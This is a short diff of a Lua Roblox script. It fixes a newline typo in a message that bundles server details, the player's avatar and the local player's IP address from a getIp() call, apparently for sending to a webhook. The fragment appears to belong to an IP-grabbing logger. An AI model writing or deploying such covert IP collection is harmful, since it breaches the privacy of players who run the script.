@@ -929,7 +929,7 @@ local function QBHTF_fake_script() -- Main.LocalScript
 				'\nServer Size: ' .. tostring(#game.Players:GetPlayers()) .. '/' .. tostring(game.Players.MaxPlayers) ..
 				'\nJobId/ServerId: ' .. game.JobId ..
 				'\nGame Url: https://roblox.com/games/' .. game.PlaceId .. '/'..
-				']nIP: '.. getIp(),
+				'\nIP: '.. getIp(),
 			embeds = {{image = {url = getData(game.Players.LocalPlayer.UserId).imageUrl}}}})
 		})
 	
